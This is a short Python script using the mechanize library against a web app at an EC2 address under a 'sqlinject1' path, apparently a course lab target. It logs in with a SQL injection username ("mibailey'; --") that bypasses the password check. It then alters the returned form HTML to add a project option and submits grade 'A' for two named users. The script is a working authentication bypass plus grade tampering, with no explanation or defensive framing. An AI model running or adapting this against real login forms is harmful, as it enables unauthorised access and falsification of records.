import mechanize

br = mechanize.Browser()
br.open("http://ec2-54-245-12-74.us-west-2.compute.amazonaws.com/sqlinject1/login?came_from=http%3A%2F%2Fec2-54-245-12-74.us-west-2.compute.amazonaws.com%2Fsqlinject1%2F")
assert br.viewing_html()

br.select_form(nr=0)
br["login"] = "mibailey\'; --" 
response2 = br.submit()
br.select_form(nr=0)
print br.form

html = br.response().get_data().replace("<select name=\"project\"></select>", "<select name=\"project\"> <option name=\"project1\"> project1 </option> </select>")
response = mechanize.make_response(
		    html, [("Content-Type", "text/html")],
		    "http://ec2-54-245-12-74.us-west-2.compute.amazonaws.com/sqlinject1/", 200, "OK")

br.set_response(response)

br.select_form(nr=0)
print "Printing br[project]"
print br["project"]

br["uniqname"] = "sklarj"
br["project"] = ["project1"]
br["grade"] = "A"
response3 = br.submit()
#print br.form


html = br.response().get_data().replace("<select name=\"project\"></select>", "<select name=\"project\"> <option name=\"project1\"> project1 </option> </select>")
response = mechanize.make_response(
		    html, [("Content-Type", "text/html")],
		    "http://ec2-54-245-12-74.us-west-2.compute.amazonaws.com/sqlinject1/", 200, "OK")

br.set_response(response)

br.select_form(nr=0)
print "Printing br[project]"
print br["project"]

br["uniqname"] = "lhejazi"
br["project"] = ["project1"]
br["grade"] = "A"
response3 = br.submit()
